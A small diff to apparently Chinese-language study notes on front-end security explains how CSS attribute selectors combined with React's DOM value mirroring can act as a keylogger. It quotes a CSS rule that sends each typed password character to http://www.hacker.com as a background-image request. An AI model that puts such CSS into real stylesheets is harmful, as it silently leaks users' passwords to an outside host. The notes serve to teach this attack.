@@ -162,7 +162,7 @@
     - css选择器中存在这一种选择器：`input[type="password"][value$="1"]`,表示会选中 密码输入框中 属性value的值以1结尾的input框
     - 默认情况下，在input中输入什么值，是不会直接反馈到input元素上的，比如input中输入123，html中，input的结构还是`<input type="" />`,不会增加一个value="123" 的属性，要通过document.querySelector('input').value的方式才能获取到值。
     - 有些前端框架，比如react，则会将input的value值，直接写到input的dom结构上，比如input中输入123，html中，input的结构还是`<input type="" value="123" />`，查看<https://www.runoob.com/try/try.php?filename=try_react_form>，打开控制台就能验证。
-    - 结合前面的，`input[type="password"][value$="1"] { background-image: url("http://www.hacker.com/1"); }`这段代码的含义就是，给value值以1结尾的input，加上一个背景图。隐含的操作是：当输入框中输入1时，会向http://www.hacker.com/1发送一个请求，告诉该站点，用户输入了一个1。
+    - 结合前面的，`input[type="password"][value$="1"] { background-image: url("http://www.hacker.com/1"); }`这段代码的含义就是，给value属性的值以1结尾的input，加上一个背景图。隐含的操作是：当输入框中输入1时，会向http://www.hacker.com/1发送一个请求，告诉该站点，用户输入了一个1。
 
 - 工作流程：
     - 假设页面上加载了一段第三方的css文件:ui.css,css的内容如下，页面的框架是react。
